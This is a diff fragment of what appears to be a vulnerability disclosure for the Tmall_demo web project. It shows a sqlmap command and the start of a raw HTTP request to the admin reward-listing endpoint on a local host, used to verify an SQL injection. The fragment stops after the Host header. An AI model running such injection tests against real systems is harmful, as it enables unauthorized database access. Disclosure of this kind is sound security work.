@@ -21,12 +21,14 @@ https://gitee.com/project_team/Tmall_demo
 # verify
 
 r.txt
-![image](https://github.com/user-attachments/assets/a18389be-0cab-4f30-81d7-124a10199f30)
+
 
 sqlmap test results
 
 ```sqlmap -r r.txt --dbs```
+
 r.txt
+
 ```
 GET /tmall/admin/reward/0/10?reward_name=1&reward_lowest_amount=&reward_highest_amount=&reward_isEnabled_array=0&reward_isEnabled_array=1&reward_isEnabled_array=2&orderBy=&isDesc=true HTTP/1.1
 Host: 127.0.0.1:8887
